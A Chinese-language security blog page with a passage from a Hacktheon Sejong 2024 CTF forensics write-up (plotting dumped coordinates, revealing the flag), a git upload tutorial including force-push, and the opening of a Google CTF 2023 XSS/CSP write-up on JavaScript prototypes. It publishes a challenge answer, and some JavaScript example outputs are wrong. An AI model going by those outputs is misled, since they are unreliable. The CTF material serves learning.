(73,50), (73,51), (73,52), (73,53), (73,54), (73,55), (73,56), (73,57), (73,58), (73,59), (73,60), (73,61), (73,62), (73,63), (73,64), (73,65), (73,66), (73,67), (73,68), (73,69), (73,70), (73,71), (73,72), (73,73), (73,74), (73,75), (73,76), (73,77), (73,78), (73,79), (73,80), (73,81), (73,82), (73,83), (73,84), (73,93), (73,94), (73,95), (73,96), (73,97), (73,98), (73,99), (73,100), (73,101), (73,102), (73,103), (73,104), (73,105), (73,106), (73,107), (73,108), (73,109), (73,110), (73,111), (73,112), (73,113), (73,114), (73,115), (73,116), (73,117), (73,118), (73,119), (73,120), (73,121), (73,122), (73,123), (73,124), (73,125), (73,126), (73,127), (73,128), (73,129), (73,130), (73,131), (73,132), (73,157), (73,158), (73,159), (73,160), (73,161), (73,162), (73,163), (73,164), (73,165), (73,166), (73,167), (73,168), (73,169), (73,170), (73,171), (73,172), (73,173), (73,174), (73,175), (73,176), (73,177), (73,178), (73,179), (73,180), (73,181), (73,182), (73,183), (73,184), (73,185), (73,186), (73,187), (73,188), (73,237), (73,238), (73,239), (73,240), (73,241), (73,242), (73,243), (73,244), (73,245), (73,246), (73,247), (73,248), (73,249), (73,250), (73,251), (73,252), (73,293), (73,294), (73,295), (73,296), (73,297), (73,298), (73,299), (73,300), (73,301), (73,302), (73,303), (73,304), (73,305), (73,306), (73,307), (73,308), (73,309), (73,310), (73,311), (73,312), (73,313), (73,314), (73,315), (73,316), (73,317), (73,318), (73,319), (73,320), (73,321), (73,322), (73,323), (73,324), (73,325), (73,326), (73,327), (73,328), (73,329), (73,330), (73,331), (73,332), (73,341), (73,342), (73,343), (73,344), (73,345), (73,346), (73,347), (73,348), (73,349), (73,350), (73,351), (73,352), (73,353), (73,354), (73,355), (73,356), (73,357), (73,358), (73,359), (73,360), (73,361), (73,362), (73,363), (73,364), (73,365), (73,366), (73,367), (73,368), (73,369), (73,370), (73,371), (73,372), (73,373), (73,374), (73,375), (73,376), (73,377), (73,378), (73,379), (73,380), (73,381), (73,382), (73,383), (73,384), (73,385), (73,386), (73,387), (73,388), (73,397), (73,398), (73,399), (73,400), (73,401), (73,402), (73,403), (73,404), (73,445), (73,446), (73,447), (73,448), (73,449), (73,450), (73,451), (73,452), (73,477), (73,478), (73,479), (73,480), (73,481), (73,482), (73,483), (73,484), (74,5), (74,6), (74,7), (74,8), (74,9), (74,10), (74,11), (74,12), (74,29), (74,30), (74,31), (74,32), (74,33), (74,34), (74,35), (74,36), (74,37), (74,38), (74,39), (74,40), (74,41), (74,42), (74,43), (74,44), (74,45), (74,46), (74,47), (74,48), (74,49), (74,50), (74,51), (74,52), (74,53), (74,54), (74,55), (74,56), (74,57), (74,58), (74,59), (74,60), (74,61), (74,62), (74,63), (74,64), (74,65), (74,66), (74,67), (74,68), (74,69), (74,70), (74,71), (74,72), (74,73), (74,74), (74,75), (74,76), (74,77), (74,78), (74,79), (74,80), (74,81), (74,82), (74,83), (74,84), (74,93), (74,94), (74,95), (74,96), (74,97), (74,98), (74,99), (74,100), (74,101), (74,102), (74,103), (74,104), (74,105), (74,106), (74,107), (74,108), (74,109), (74,110), (74,111), (74,112), (74,113), (74,114), (74,115), (74,116), (74,117), (74,118), (74,119), (74,120), (74,121), (74,122), (74,123), (74,124), (74,125), (74,126), (74,127), (74,128), (74,129), (74,130), (74,131), (74,132), (74,157), (74,158), (74,159), (74,160), (74,161), (74,162), (74,163), (74,164), (74,165), (74,166), (74,167), (74,168), (74,169), (74,170), (74,171), (74,172), (74,173), (74,174), (74,175), (74,176), (74,177), (74,178), (74,179), (74,180), (74,181), (74,182), (74,183), (74,184), (74,185), (74,186), (74,187), (74,188), (74,237), (74,238), (74,239), (74,240), (74,241), (74,242), (74,243), (74,244), (74,245), (74,246), (74,247), (74,248), (74,249), (74,250), (74,251), (74,252), (74,293), (74,294), (74,295), (74,296), (74,297), (74,298), (74,299), (74,300), (74,301), (74,302), (74,303), (74,304), (74,305), (74,306), (74,307), (74,308), (74,309), (74,310), (74,311), (74,312), (74,313), (74,314), (74,315), (74,316), (74,317), (74,318), (74,319), (74,320), (74,321), (74,322), (74,323), (74,324), (74,325), (74,326), (74,327), (74,328), (74,329), (74,330), (74,331), (74,332), (74,341), (74,342), (74,343), (74,344), (74,345), (74,346), (74,347), (74,348), (74,349), (74,350), (74,351), (74,352), (74,353), (74,354), (74,355), (74,356), (74,357), (74,358), (74,359), (74,360), (74,361), (74,362), (74,363), (74,364), (74,365), (74,366), (74,367), (74,368), (74,369), (74,370), (74,371), (74,372), (74,373), (74,374), (74,375), (74,376), (74,377), (74,378), (74,379), (74,380), (74,381), (74,382), (74,383), (74,384), (74,385), (74,386), (74,387), (74,388), (74,397), (74,398), (74,399), (74,400), (74,401), (74,402), (74,403), (74,404), (74,445), (74,446), (74,447), (74,448), (74,449), (74,450), (74,451), (74,452), (74,477), (74,478), (74,479), (74,480), (74,481), (74,482), (74,483), (74,484), (75,5), (75,6), (75,7), (75,8), (75,9), (75,10), (75,11), (75,12), (75,29), (75,30), (75,31), (75,32), (75,33), (75,34), (75,35), (75,36), (75,37), (75,38), (75,39), (75,40), (75,41), (75,42), (75,43), (75,44), (75,45), (75,46), (75,47), (75,48), (75,49), (75,50), (75,51), (75,52), (75,53), (75,54), (75,55), (75,56), (75,57), (75,58), (75,59), (75,60), (75,61), (75,62), (75,63), (75,64), (75,65), (75,66), (75,67), (75,68), (75,69), (75,70), (75,71), (75,72), (75,73), (75,74), (75,75), (75,76), (75,77), (75,78), (75,79), (75,80), (75,81), (75,82), (75,83), (75,84), (75,93), (75,94), (75,95), (75,96), (75,97), (75,98), (75,99), (75,100), (75,101), (75,102), (75,103), (75,104), (75,105), (75,106), (75,107), (75,108), (75,109), (75,110), (75,111), (75,112), (75,113), (75,114), (75,115), (75,116), (75,117), (75,118), (75,119), (75,120), (75,121), (75,122), (75,123), (75,124), (75,125), (75,126), (75,127), (75,128), (75,129), (75,130), (75,131), (75,132), (75,157), (75,158), (75,159), (75,160), (75,161), (75,162), (75,163), (75,164), (75,165), (75,166), (75,167), (75,168), (75,169), (75,170), (75,171), (75,172), (75,173), (75,174), (75,175), (75,176), (75,177), (75,178), (75,179), (75,180), (75,181), (75,182), (75,183), (75,184), (75,185), (75,186), (75,187), (75,188), (75,237), (75,238), (75,239), (75,240), (75,241), (75,242), (75,243), (75,244), (75,245), (75,246), (75,247), (75,248), (75,249), (75,250), (75,251), (75,252), (75,293), (75,294), (75,295), (75,296), (75,297), (75,298), (75,299), (75,300), (75,301), (75,302), (75,303), (75,304), (75,305), (75,306), (75,307), (75,308), (75,309), (75,310), (75,311), (75,312), (75,313), (75,314), (75,315), (75,316), (75,317), (75,318), (75,319), (75,320), (75,321), (75,322), (75,323), (75,324), (75,325), (75,326), (75,327), (75,328), (75,329), (75,330), (75,331), (75,332), (75,341), (75,342), (75,343), (75,344), (75,345), (75,346), (75,347), (75,348), (75,349), (75,350), (75,351), (75,352), (75,353), (75,354), (75,355), (75,356), (75,357), (75,358), (75,359), (75,360), (75,361), (75,362), (75,363), (75,364), (75,365), (75,366), (75,367), (75,368), (75,369), (75,370), (75,371), (75,372), (75,373), (75,374), (75,375), (75,376), (75,377), (75,378), (75,379), (75,380), (75,381), (75,382), (75,383), (75,384), (75,385), (75,386), (75,387), (75,388), (75,397), (75,398), (75,399), (75,400), (75,401), (75,402), (75,403), (75,404), (75,445), (75,446), (75,447), (75,448), (75,449), (75,450), (75,451), (75,452), (75,477), (75,478), (75,479), (75,480), (75,481), (75,482), (75,483), (75,484), (76,5), (76,6), (76,7), (76,8), (76,9), (76,10), (76,11), (76,12), (76,29), (76,30), (76,31), (76,32), (76,33), (76,34), (76,35), (76,36), (76,37), (76,38), (76,39), (76,40), (76,41), (76,42), (76,43), (76,44), (76,45), (76,46), (76,47), (76,48), (76,49), (76,50), (76,51), (76,52), (76,53), (76,54), (76,55), (76,56), (76,57), (76,58), (76,59), (76,60), (76,61), (76,62), (76,63), (76,64), (76,65), (76,66), (76,67), (76,68), (76,69), (76,70), (76,71), (76,72), (76,73), (76,74), (76,75), (76,76), (76,77), (76,78), (76,79), (76,80), (76,81), (76,82), (76,83), (76,84), (76,93), (76,94), (76,95), (76,96), (76,97), (76,98), (76,99), (76,100), (76,101), (76,102), (76,103), (76,104), (76,105), (76,106), (76,107), (76,108), (76,109), (76,110), (76,111), (76,112), (76,113), (76,114), (76,115), (76,116), (76,117), (76,118), (76,119), (76,120), (76,121), (76,122), (76,123), (76,124), (76,125), (76,126), (76,127), (76,128), (76,129), (76,130), (76,131), (76,132), (76,157), (76,158), (76,159), (76,160), (76,161), (76,162), (76,163), (76,164), (76,165), (76,166), (76,167), (76,168), (76,169), (76,170), (76,171), (76,172), (76,173), (76,174), (76,175), (76,176), (76,177), (76,178), (76,179), (76,180), (76,181), (76,182), (76,183), (76,184), (76,185), (76,186), (76,187), (76,188), (76,237), (76,238), (76,239), (76,240), (76,241), (76,242), (76,243), (76,244), (76,245), (76,246), (76,247), (76,248), (76,249), (76,250), (76,251), (76,252), (76,293), (76,294), (76,295), (76,296), (76,297), (76,298), (76,299), (76,300), (76,301), (76,302), (76,303), (76,304), (76,305), (76,306), (76,307), (76,308), (76,309), (76,310), (76,311), (76,312), (76,313), (76,314), (76,315), (76,316), (76,317), (76,318), (76,319), (76,320), (76,321), (76,322), (76,323), (76,324), (76,325), (76,326), (76,327), (76,328), (76,329), (76,330), (76,331), (76,332), (76,341), (76,342), (76,343), (76,344), (76,345), (76,346), (76,347), (76,348), (76,349), (76,350), (76,351), (76,352), (76,353), (76,354), (76,355), (76,356), (76,357), (76,358), (76,359), (76,360), (76,361), (76,362), (76,363), (76,364), (76,365), (76,366), (76,367), (76,368), (76,369), (76,370), (76,371), (76,372), (76,373), (76,374), (76,375), (76,376), (76,377), (76,378), (76,379), (76,380), (76,381), (76,382), (76,383), (76,384), (76,385), (76,386), (76,387), (76,388), (76,397), (76,398), (76,399), (76,400), (76,401), (76,402), (76,403), (76,404), (76,445), (76,446), (76,447), (76,448), (76,449), (76,450), (76,451), (76,452), (76,477), (76,478), (76,479), (76,480), (76,481), (76,482), (76,483), (76,484), (77,5), (77,6), (77,7), (77,8), (77,9), (77,10), (77,11), (77,12), (77,29), (77,30), (77,31), (77,32), (77,33), (77,34), (77,35), (77,36), (77,37), (77,38), (77,39), (77,40), (77,41), (77,42), (77,43), (77,44), (77,45), (77,46), (77,47), (77,48), (77,49), (77,50), (77,51), (77,52), (77,53), (77,54), (77,55), (77,56), (77,57), (77,58), (77,59), (77,60), (77,61), (77,62), (77,63), (77,64), (77,65), (77,66), (77,67), (77,68), (77,69), (77,70), (77,71), (77,72), (77,73), (77,74), (77,75), (77,76), (77,77), (77,78), (77,79), (77,80), (77,81), (77,82), (77,83), (77,84), (77,93), (77,94), (77,95), (77,96), (77,97), (77,98), (77,99), (77,100), (77,101), (77,102), (77,103), (77,104), (77,105), (77,106), (77,107), (77,108), (77,109), (77,110), (77,111), (77,112), (77,113), (77,114), (77,115), (77,116), (77,117), (77,118), (77,119), (77,120), (77,121), (77,122), (77,123), (77,124), (77,125), (77,126), (77,127), (77,128), (77,129), (77,130), (77,131), (77,132), (77,157), (77,158), (77,159), (77,160), (77,161), (77,162), (77,163), (77,164), (77,165), (77,166), (77,167), (77,168), (77,169), (77,170), (77,171), (77,172), (77,173), (77,174), (77,175), (77,176), (77,177), (77,178), (77,179), (77,180), (77,181), (77,182), (77,183), (77,184), (77,185), (77,186), (77,187), (77,188), (77,237), (77,238), (77,239), (77,240), (77,241), (77,242), (77,243), (77,244), (77,245), (77,246), (77,247), (77,248), (77,249), (77,250), (77,251), (77,252), (77,293), (77,294), (77,295), (77,296), (77,297), (77,298), (77,299), (77,300), (77,301), (77,302), (77,303), (77,304), (77,305), (77,306), (77,307), (77,308), (77,309), (77,310), (77,311), (77,312), (77,313), (77,314), (77,315), (77,316), (77,317), (77,318), (77,319), (77,320), (77,321), (77,322), (77,323), (77,324), (77,325), (77,326), (77,327), (77,328), (77,329), (77,330), (77,331), (77,332), (77,341), (77,342), (77,343), (77,344), (77,345), (77,346), (77,347), (77,348), (77,349), (77,350), (77,351), (77,352), (77,353), (77,354), (77,355), (77,356), (77,357), (77,358), (77,359), (77,360), (77,361), (77,362), (77,363), (77,364), (77,365), (77,366), (77,367), (77,368), (77,369), (77,370), (77,371), (77,372), (77,373), (77,374), (77,375), (77,376), (77,377), (77,378), (77,379), (77,380), (77,381), (77,382), (77,383), (77,384), (77,385), (77,386), (77,387), (77,388), (77,397), (77,398), (77,399), (77,400), (77,401), (77,402), (77,403), (77,404), (77,445), (77,446), (77,447), (77,448), (77,449), (77,450), (77,451), (77,452), (77,477), (77,478), (77,479), (77,480), (77,481), (77,482), (77,483), (77,484), (78,5), (78,6), (78,7), (78,8), (78,9), (78,10), (78,11), (78,12), (78,29), (78,30), (78,31), (78,32), (78,33), (78,34), (78,35), (78,36), (78,37), (78,38), (78,39), (78,40), (78,41), (78,42), (78,43), (78,44), (78,45), (78,46), (78,47), (78,48), (78,49), (78,50), (78,51), (78,52), (78,53), (78,54), (78,55), (78,56), (78,57), (78,58), (78,59), (78,60), (78,61), (78,62), (78,63), (78,64), (78,65), (78,66), (78,67), (78,68), (78,69), (78,70), (78,71), (78,72), (78,73), (78,74), (78,75), (78,76), (78,77), (78,78), (78,79), (78,80), (78,81), (78,82), (78,83), (78,84), (78,93), (78,94), (78,95), (78,96), (78,97), (78,98), (78,99), (78,100), (78,101), (78,102), (78,103), (78,104), (78,105), (78,106), (78,107), (78,108), (78,109), (78,110), (78,111), (78,112), (78,113), (78,114), (78,115), (78,116), (78,117), (78,118), (78,119), (78,120), (78,121), (78,122), (78,123), (78,124), (78,125), (78,126), (78,127), (78,128), (78,129), (78,130), (78,131), (78,132), (78,157), (78,158), (78,159), (78,160), (78,161), (78,162), (78,163), (78,164), (78,165), (78,166), (78,167), (78,168), (78,169), (78,170), (78,171), (78,172), (78,173), (78,174), (78,175), (78,176), (78,177), (78,178), (78,179), (78,180), (78,181), (78,182), (78,183), (78,184), (78,185), (78,186), (78,187), (78,188), (78,237), (78,238), (78,239), (78,240), (78,241), (78,242), (78,243), (78,244), (78,245), (78,246), (78,247), (78,248), (78,249), (78,250), (78,251), (78,252), (78,293), (78,294), (78,295), (78,296), (78,297), (78,298), (78,299), (78,300), (78,301), (78,302), (78,303), (78,304), (78,305), (78,306), (78,307), (78,308), (78,309), (78,310), (78,311), (78,312), (78,313), (78,314), (78,315), (78,316), (78,317), (78,318), (78,319), (78,320), (78,321), (78,322), (78,323), (78,324), (78,325), (78,326), (78,327), (78,328), (78,329), (78,330), (78,331), (78,332), (78,341), (78,342), (78,343), (78,344), (78,345), (78,346), (78,347), (78,348), (78,349), (78,350), (78,351), (78,352), (78,353), (78,354), (78,355), (78,356), (78,357), (78,358), (78,359), (78,360), (78,361), (78,362), (78,363), (78,364), (78,365), (78,366), (78,367), (78,368), (78,369), (78,370), (78,371), (78,372), (78,373), (78,374), (78,375), (78,376), (78,377), (78,378), (78,379), (78,380), (78,381), (78,382), (78,383), (78,384), (78,385), (78,386), (78,387), (78,388), (78,397), (78,398), (78,399), (78,400), (78,401), (78,402), (78,403), (78,404), (78,445), (78,446), (78,447), (78,448), (78,449), (78,450), (78,451), (78,452), (78,477), (78,478), (78,479), (78,480), (78,481), (78,482), (78,483), (78,484), (79,5), (79,6), (79,7), (79,8), (79,9), (79,10), (79,11), (79,12), (79,29), (79,30), (79,31), (79,32), (79,33), (79,34), (79,35), (79,36), (79,37), (79,38), (79,39), (79,40), (79,41), (79,42), (79,43), (79,44), (79,45), (79,46), (79,47), (79,48), (79,49), (79,50), (79,51), (79,52), (79,53), (79,54), (79,55), (79,56), (79,57), (79,58), (79,59), (79,60), (79,61), (79,62), (79,63), (79,64), (79,65), (79,66), (79,67), (79,68), (79,69), (79,70), (79,71), (79,72), (79,73), (79,74), (79,75), (79,76), (79,77), (79,78), (79,79), (79,80), (79,81), (79,82), (79,83), (79,84), (79,93), (79,94), (79,95), (79,96), (79,97), (79,98), (79,99), (79,100), (79,101), (79,102), (79,103), (79,104), (79,105), (79,106), (79,107), (79,108), (79,109), (79,110), (79,111), (79,112), (79,113), (79,114), (79,115), (79,116), (79,117), (79,118), (79,119), (79,120), (79,121), (79,122), (79,123), (79,124), (79,125), (79,126), (79,127), (79,128), (79,129), (79,130), (79,131), (79,132), (79,157), (79,158), (79,159), (79,160), (79,161), (79,162), (79,163), (79,164), (79,165), (79,166), (79,167), (79,168), (79,169), (79,170), (79,171), (79,172), (79,173), (79,174), (79,175), (79,176), (79,177), (79,178), (79,179), (79,180), (79,181), (79,182), (79,183), (79,184), (79,185), (79,186), (79,187), (79,188), (79,237), (79,238), (79,239), (79,240), (79,241), (79,242), (79,243), (79,244), (79,245), (79,246), (79,247), (79,248), (79,249), (79,250), (79,251), (79,252), (79,293), (79,294), (79,295), (79,296), (79,297), (79,298), (79,299), (79,300), (79,301), (79,302), (79,303), (79,304), (79,305), (79,306), (79,307), (79,308), (79,309), (79,310), (79,311), (79,312), (79,313), (79,314), (79,315), (79,316), (79,317), (79,318), (79,319), (79,320), (79,321), (79,322), (79,323), (79,324), (79,325), (79,326), (79,327), (79,328), (79,329), (79,330), (79,331), (79,332), (79,341), (79,342), (79,343), (79,344), (79,345), (79,346), (79,347), (79,348), (79,349), (79,350), (79,351), (79,352), (79,353), (79,354), (79,355), (79,356), (79,357), (79,358), (79,359), (79,360), (79,361), (79,362), (79,363), (79,364), (79,365), (79,366), (79,367), (79,368), (79,369), (79,370), (79,371), (79,372), (79,373), (79,374), (79,375), (79,376), (79,377), (79,378), (79,379), (79,380), (79,381), (79,382), (79,383), (79,384), (79,385), (79,386), (79,387), (79,388), (79,397), (79,398), (79,399), (79,400), (79,401), (79,402), (79,403), (79,404), (79,445), (79,446), (79,447), (79,448), (79,449), (79,450), (79,451), (79,452), (79,477), (79,478), (79,479), (79,480), (79,481), (79,482), (79,483), (79,484)</span><br></pre></td></tr></table></figure>
<p>雖然導出後，後面會參雜一堆亂碼，因為檔案內容很多，所以我打算寫到txt檔案中，再由腳本讀取</p>
<p>接下來需要寫腳本把這些區塊的內容顯示出來</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import re</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 讀取儲存座標的txt檔案</span></span><br><span class="line">with open(<span class="string">&#x27;coor.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) as file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將每一行轉換為座標並儲存在清單中</span></span><br><span class="line">coordinates = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="comment"># 使用正則表達式找到所有座標對，並將其轉換為座標</span></span><br><span class="line">    matches = re.findall(r<span class="string">&#x27;\((\d+),(\d+)\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">for</span> match <span class="keyword">in</span> matches:</span><br><span class="line">        x, y = map(int, match)</span><br><span class="line">        coordinates.append((x, y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分離x和y座標</span></span><br><span class="line">x_coords = [coord[0] <span class="keyword">for</span> coord <span class="keyword">in</span> coordinates]</span><br><span class="line">y_coords = [coord[1] <span class="keyword">for</span> coord <span class="keyword">in</span> coordinates]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 繪製座標點</span></span><br><span class="line">plt.scatter(x_coords, y_coords)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Coordinates in XY-plane&#x27;</span>)</span><br><span class="line">plt.grid(True)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="img/hackthonkor_24.png" alt="Untitled"></p>
<p> <code>I_LOVE_XY</code></p>
<p>參考資料</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zer0o/p/17184673.html">https://www.cnblogs.com/Zer0o/p/17184673.html</a></li>
<li><a target="_blank" rel="noopener" href="https://stylesuxx.github.io/steganography/">https://stylesuxx.github.io/steganography/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/n00bzUnit3d/n00bzCTF2023-OfficalWriteups/tree/master/Forensics/QRazyCSV">https://github.com/n00bzUnit3d/n00bzCTF2023-OfficalWriteups/tree/master/Forensics/QRazy CSV</a></li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/matplotlib/matplotlib-pyplot.html">https://www.runoob.com/matplotlib/matplotlib-pyplot.html</a></li>
</ul>
<hr>
<p>通過這次競賽，學到了很多，我很感謝隊友在賽後給我的幫助，我也因此結識到很棒的朋友，也是引領著自己繼續前進，希望有天能追上大家的腳步!!</p>
<p><img src="img/hackthonkor_25.png" alt="Untitled"></p>
<p><img src="img/hackthonkor_26.png" alt="Untitled"></p>
<p><img src="img/hackthonkor_27.png" alt="Untitled"></p>
<hr>
<p>其它Writeup參考</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://vicevirus.github.io/posts/hacktheon-sejong-2024-quals/#GithubReadme">Hacktheon Sejong 2024 Quals Web Write-up - vicevirus的博客</a></li>
<li><a target="_blank" rel="noopener" href="https://warlocksmurf.github.io/posts/hacktheonsejongctf2024/">Hacktheon Sejong CTF 2024 - Writeups | warlocksmurf</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Trinity-SYT-SECURITY/Hacktheon-Sejong-2024">https://github.com/Trinity-SYT-SECURITY/Hacktheon-Sejong-2024</a> 我把題目都丟在這，有解到的</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Github" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Github/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.083Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Github/">
        Upload Multiple Files To Github
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>先到Github創建一個新的專案</p>
<p>記得自己電腦要安裝git才能在本地用指令上傳檔案</p>
<p>使用管理員權限開啟CMD</p>
<p>接下來輸入:</p>
<p>系統會在該專案的資料夾中建立.git，用於暫存檔案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
<p>新增所有的檔案到暫存區，失敗才會跳出訊息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure>
<p>可以輸入<code>git status</code>來查看當前狀態上傳狀態</p>
<p>透過輸入<code>git log</code>則可以顯示相關紀錄</p>
<p>建立版本資訊</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;XXX&quot;</span><br></pre></td></tr></table></figure>
<p>建立分支，以<code>main</code>為例，有些會是<code>master</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git branch -M main</span><br></pre></td></tr></table></figure>
<p>輸入專案位置位置進行連結</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote add origin https://github.com/&quot;你的Github帳號&quot;/&quot;專案名稱&quot;.git</span><br></pre></td></tr></table></figure>
<p>有時會無法push到github中，因為線上的版本內容比你電腦這份還新</p>
<p>可以先將內容抓下來後使用rebase方式合併</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git pull --rebase origin main</span><br></pre></td></tr></table></figure>
<p>上一條指令無法運行就嘗試下面這個</p>
<p>強迫硬push上去，會把原本的內容覆蓋掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push -f</span><br></pre></td></tr></table></figure>
<p>最後將專案推送至遠端版本庫origin，origin（遠端版本庫）/main（分支）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-GoogleCTFCSP" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/GoogleCTFCSP/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.083Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/GoogleCTFCSP/">
        Google CTF 2023 - web/Biohazard
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li>14 solves / 333 pts</li>
<li>CTFtime: <a target="_blank" rel="noopener" href="https://ctftime.org/event/1929">https://ctftime.org/event/1929</a></li>
<li>title: <a target="_blank" rel="noopener" href="https://biohazard-web.2023.ctfcompetition.com/">Bio+ (ctfcompetition.com)</a></li>
<li>file:<br>  <a target="_blank" rel="noopener" href="https://storage.googleapis.com/gctf-2023-attachments-project/cab54183ea79c02df3b72d8e7af82e04957ed2e7c078e97dee5f333ecf9329ea6f1696ad3f5ada440326c25305a4b3aca6bd8f226ddc42d324f4a5b2b33dc387.zip">storage.googleapis.com</a></li>
</ul>
<p>參考資料</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://javascript.alphacamp.co/prototype-prototype-chain.html">原型繼承與原型鏈 ｜ALPHA Camp | JavaScript 入門指南</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/cc18868876837/article/details/81211729">帮你彻底搞懂JS中的prototype、<strong>proto</strong>与constructor（图解）_js <strong>proto</strong>-CSDN博客</a></li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance">JavaScript 原型和繼承 |網路安全學院 (portswigger.net)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.huli.tw/2021/09/29/prototype-pollution/">基於 JS 原型鏈的攻擊手法：Prototype Pollution - Huli’s blog</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/shhnjk/shhnjk.github.io/blob/main/thoughts/digesting-the-concept-of-trusted-types.md#template-gadget">shhnjk.github.io/thoughts/digesting-the-concept-of-trusted-types.md 在 main ·shhnjk/shhnjk.github.io ·GitHub上</a></li>
<li><a target="_blank" rel="noopener" href="https://flyme2bluemoon.github.io/blog/posts/gctf-2023-web-biohazard/">Google CTF：生化危機 - Matthew Shen (flyme2bluemoon.github.io)</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/google/google-ctf/tree/main/2023/quals/web-biohazard/solution#reviving-xss-auditor-primitive">google-ctf/2023/quals/web-biohazard/solution 在主要 ·谷歌/google-ctf ·GitHub上</a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/arkark/340ffadc009a4dd07be6696e0dec4553">谷歌 CTF 2023 - web/Biohazard ·GitHub上</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass</a></li>
</ul>
<hr>
<p>這一題主要是如何繞過CSP的限制達到XSS</p>
<p>這題也有原型污染的漏洞，在開始說明及分析以前，先來了解關於JS的原型和繼承的概念</p>
<p>簡單來說就是讓一個物件取得另一個物件的屬性與方法，這就是繼承的概念</p>
<p>每個物件都連結到某種類型的另一個物件，稱為其原型</p>
<p>JS 的繼承系統會透過prototype chain連接到其他物件功能，這就是原型繼承</p>
<p><img src="img/GoogleCTFCSP.png" alt="Untitled"></p>
<p>For example:</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name) <span class="comment">//&quot;test&quot;</span></span><br></pre></td></tr></table></figure>
<p>此時的name是不具備屬性和方法的</p>
<p>當字串name原型來自建構子String()，可以用constructor.name查看</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name.<span class="property">constructor</span>.<span class="property">name</span>) <span class="comment">//&quot;String&quot;</span></span><br></pre></td></tr></table></figure>
<p>此時的name是透過建構式函式 String() 產生實例</p>
<p>透過prototype chain，字串name可以取用String.prototype裡面定義好的方法，因此你可以使用 <code>.split()</code>, <code>.slice()</code>, <code>.toLowerCase()</code> 等字串方法</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">name.<span class="title function_">toLowerCase</span>() <span class="comment">// &quot;test&quot;</span></span><br><span class="line">name.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">3</span>) <span class="comment">//&quot;Tes&quot;</span></span><br><span class="line">name.<span class="title function_">splite</span>(<span class="string">&#x27;s&#x27;</span>) <span class="comment">// [&quot;Te&quot;,&quot;T&quot;]</span></span><br></pre></td></tr></table></figure>
<p>所以什麼是原型?</p>
<p>透過建構式函式所產生的物件，都會攜帶一個原型物件</p>
